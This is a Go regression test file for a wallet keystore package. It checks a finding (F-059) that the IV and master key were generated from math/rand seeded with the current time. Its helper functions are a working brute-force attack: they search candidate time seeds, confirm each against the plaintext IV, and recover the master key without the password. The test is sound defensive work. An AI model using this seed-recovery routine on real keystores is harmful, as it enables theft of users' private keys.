// Copyright (c) 2017-2020 The Elastos Foundation
// Use of this source code is governed by an MIT
// license that can be found in the LICENSE file.
//

package account

import (
	"bytes"
	"math/rand"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

// f059SeedWindowNanos bounds the wall-clock seed search performed by the
// attacker model below. Measured seed offsets from a caller-observable
// timestamp taken immediately before NewClient are 2.5-6 microseconds, so a
// 1 ms window is roughly a 160x margin. A real attacker bounds the seed by the
// keystore file's mtime instead, which is coarser but still entirely
// searchable - the point of the window here is only to keep the test fast.
const f059SeedWindowNanos = int64(1000000)

// f059DeriveFromSeed replays the pre-fix keystore key derivation for one
// candidate wall-clock seed: 16 IV bytes followed by 32 master-key bytes drawn
// from a single math/rand stream.
func f059DeriveFromSeed(seed int64) (iv []byte, masterKey []byte) {
	r := rand.New(rand.NewSource(seed))
	iv = make([]byte, 16)
	for i := range iv {
		iv[i] = byte(r.Intn(256))
	}
	masterKey = make([]byte, 32)
	for i := range masterKey {
		masterKey[i] = byte(r.Intn(256))
	}
	return iv, masterKey
}

// f059SearchSeed brute-forces [base, base+window) for the seed whose math/rand
// stream reproduces wantIV, and returns the master key that immediately follows
// it in that stream. This is exactly the attacker's job: the IV is written to
// the keystore in plaintext, so it is a 128-bit oracle that confirms a
// candidate seed with no password involved.
func f059SearchSeed(base, window int64, wantIV []byte) (int64, []byte, bool) {
	workers := runtime.NumCPU()
	if workers < 1 {
		workers = 1
	}

	var (
		wg        sync.WaitGroup
		found     int32
		mu        sync.Mutex
		foundSeed int64
		foundKey  []byte
	)

	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(start int64) {
			defer wg.Done()
			n := 0
			for off := start; off < window; off += int64(workers) {
				n++
				if n&0xfff == 0 && atomic.LoadInt32(&found) != 0 {
					return
				}
				seed := base + off
				r := rand.New(rand.NewSource(seed))
				match := true
				for i := 0; i < len(wantIV); i++ {
					if byte(r.Intn(256)) != wantIV[i] {
						match = false
						break
					}
				}
				if !match {
					continue
				}
				masterKey := make([]byte, 32)
				for i := range masterKey {
					masterKey[i] = byte(r.Intn(256))
				}
				mu.Lock()
				if atomic.CompareAndSwapInt32(&found, 0, 1) {
					foundSeed, foundKey = seed, masterKey
				}
				mu.Unlock()
				return
			}
		}(int64(w))
	}
	wg.Wait()

	if atomic.LoadInt32(&found) == 0 {
		return 0, nil, false
	}
	return foundSeed, foundKey, true
}

// TestF059KeystoreMasterKeyNotRecoverableFromWallClockSeed is the
// fail-on-pristine test for F-059.
//
// Before the fix, NewClient(create=true) drew the keystore IV and the 32-byte
// master key from `rand.New(rand.NewSource(time.Now().UnixNano()))`. Because
// the IV is stored in the keystore in plaintext and is drawn from the same
// stream immediately before the master key, anyone holding the file can search
// the plausible creation timestamps, confirm the seed against the IV, and read
// the master key straight out of the stream - decrypting every private key in
// the store without ever knowing the password.
//
// On pristine code this test finds the seed and fails. With the fix (crypto/rand)
// no seed in the window reproduces the IV and it passes.
func TestF059KeystoreMasterKeyNotRecoverableFromWallClockSeed(t *testing.T) {
	// Harness sanity first: the searcher must be able to find a seed planted
	// at the very far end of the window. Without this guard a broken or
	// too-narrow search would silently report "not recoverable" and mask the
	// vulnerability instead of proving it fixed.
	sanityBase := time.Now().UnixNano()
	plantSeed := sanityBase + f059SeedWindowNanos - 1
	plantIV, plantKey := f059DeriveFromSeed(plantSeed)
	gotSeed, gotKey, ok := f059SearchSeed(sanityBase, f059SeedWindowNanos, plantIV)
	if !ok || gotSeed != plantSeed || !bytes.Equal(gotKey, plantKey) {
		t.Fatalf("seed-search harness is broken: ok=%v seed=%d want=%d keyMatch=%v",
			ok, gotSeed, plantSeed, bytes.Equal(gotKey, plantKey))
	}

	path := filepath.Join(t.TempDir(), "keystore.dat")
	_ = os.Remove(path)

	t0 := time.Now().UnixNano()
	client := NewClient(path, []byte("correct horse battery staple"), true)
	if client == nil {
		t.Fatal("NewClient(create=true) returned nil")
	}

	// The attacker holds only the keystore file, so read the plaintext IV back
	// out of it the way an attacker would rather than reaching into the
	// in-memory client.
	store := FileStore{path: path}
	storedIV, err := store.LoadStoredData("IV")
	if err != nil {
		t.Fatalf("failed to read the stored IV: %v", err)
	}
	if len(storedIV) != 16 {
		t.Fatalf("unexpected stored IV length %d", len(storedIV))
	}

	seed, recovered, ok := f059SearchSeed(t0, f059SeedWindowNanos, storedIV)
	if ok {
		t.Fatalf("F-059: keystore master key recovered with no password. "+
			"seed=%d (offset %d ns from an observable timestamp), "+
			"recovered master key equals the real one: %v",
			seed, seed-t0, bytes.Equal(recovered, client.masterKey))
	}
}

// TestF059KeystoreKeyMaterialIsFresh checks the second-order consequence of the
// same defect: two keystores created back to back must not share key material.
// A time-seeded stream makes that a real possibility on coarse-clock platforms,
// and it is a cheap invariant to hold onto.
func TestF059KeystoreKeyMaterialIsFresh(t *testing.T) {
	dir := t.TempDir()
	seen := make(map[string]bool)
	for i := 0; i < 8; i++ {
		path := filepath.Join(dir, "keystore", "ks.dat")
		if err := os.MkdirAll(filepath.Dir(path), 0700); err != nil {
			t.Fatalf("mkdir: %v", err)
		}
		_ = os.Remove(path)
		client := NewClient(path, []byte("correct horse battery staple"), true)
		if client == nil {
			t.Fatal("NewClient(create=true) returned nil")
		}
		key := string(client.iv) + "|" + string(client.masterKey)
		if seen[key] {
			t.Fatalf("F-059: keystore #%d reproduced key material seen before", i)
		}
		seen[key] = true
	}
}
